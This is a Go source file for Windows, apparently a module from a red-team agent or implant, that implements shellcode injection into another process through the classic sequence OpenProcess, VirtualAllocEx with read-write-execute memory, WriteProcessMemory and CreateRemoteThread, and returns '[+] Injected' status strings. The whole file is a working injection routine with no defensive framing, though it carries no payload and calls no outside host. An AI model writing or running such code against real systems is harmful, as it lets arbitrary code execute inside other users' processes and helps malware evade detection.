//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess         = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	procCloseHandle         = kernel32.NewProc("CloseHandle")
	procVirtualFreeEx       = kernel32.NewProc("VirtualFreeEx")
)

const (
	PROCESS_ALL_ACCESS       = 0x1F0FFF
	MEM_COMMIT               = 0x1000
	MEM_RESERVE              = 0x2000
	PAGE_EXECUTE_READWRITE   = 0x40
	MEM_RELEASE              = 0x8000
	WAIT_TIMEOUT             = 0x00000102
)

// injectShellcode uses the classic CreateRemoteThread technique on Windows:
// OpenProcess → VirtualAllocEx (RWX) → WriteProcessMemory → CreateRemoteThread
func injectShellcode(pid int, shellcode []byte) (string, string) {
	// Open target process
	hProc, _, err := procOpenProcess.Call(
		PROCESS_ALL_ACCESS,
		0,
		uintptr(pid),
	)
	if hProc == 0 {
		return fmt.Sprintf("OpenProcess failed: %v", err), "failed"
	}
	defer procCloseHandle.Call(hProc)

	// Allocate RWX memory in remote process
	remoteAddr, _, err := procVirtualAllocEx.Call(
		hProc,
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if remoteAddr == 0 {
		return fmt.Sprintf("VirtualAllocEx failed: %v", err), "failed"
	}

	// Write shellcode
	var written uintptr
	ret, _, err := procWriteProcessMemory.Call(
		hProc,
		remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		procVirtualFreeEx.Call(hProc, remoteAddr, 0, MEM_RELEASE)
		return fmt.Sprintf("WriteProcessMemory failed: %v", err), "failed"
	}

	// Create remote thread at shellcode address
	hThread, _, err := procCreateRemoteThread.Call(
		hProc,
		0,
		0,
		remoteAddr,
		0,
		0,
		0,
	)
	if hThread == 0 {
		procVirtualFreeEx.Call(hProc, remoteAddr, 0, MEM_RELEASE)
		return fmt.Sprintf("CreateRemoteThread failed: %v", err), "failed"
	}
	defer procCloseHandle.Call(hThread)

	// Wait up to 5 seconds for the thread
	procWaitForSingleObject.Call(hThread, 5000)

	return fmt.Sprintf("[+] Injected %d bytes into PID %d via CreateRemoteThread at 0x%x",
		len(shellcode), pid, remoteAddr), "completed"
}
